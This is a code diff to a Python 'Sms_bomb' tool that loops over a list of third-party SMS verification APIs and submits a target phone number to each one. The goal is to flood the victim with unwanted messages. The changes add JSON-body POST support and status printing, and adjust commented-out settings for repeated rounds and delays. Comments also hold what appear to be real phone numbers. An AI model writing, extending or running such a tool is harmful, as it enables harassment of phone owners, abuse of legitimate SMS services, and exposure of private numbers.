@@ -40,11 +40,17 @@ class Sms_bomb:
             method = api.get('method')
             params = api.get('params')
             params[list(params.keys())[0]] = phone
+            params_type = 'params_type' in api.keys()
             if method == 'get':
                 response = requests.get(url, params=params)
+                print(response.status_code)
                 self.count += 1
             else:
-                response = requests.post(url, params=params)
+                # print(params_type == True)
+                if params_type == True:
+                    response = requests.post(url, json=params)
+                else:
+                    response = requests.post(url, params=params)
                 print(response.status_code)
                 if response.status_code == '200':
                     self.count += 1
@@ -65,9 +71,9 @@ if __name__ == "__main__":
     sms = Sms_bomb(os.path.dirname(
         sys.argv[0]) + '/sms_api.json', os.path.dirname(sys.argv[0]) + '/phone.txt')
     sms.send_sms()
-    # for i in range(1, 10):
-    #     #sms.set_sms('18016387275')
+    # for i in range(1, 20):
+    #     #     #sms.set_sms('18016387275')
     #     sms.send_sms()
-    #     time.sleep(20)
+    #     time.sleep(30)
 
-    # sms.set_sms('17721213677')
+# sms.set_sms('17721213677')
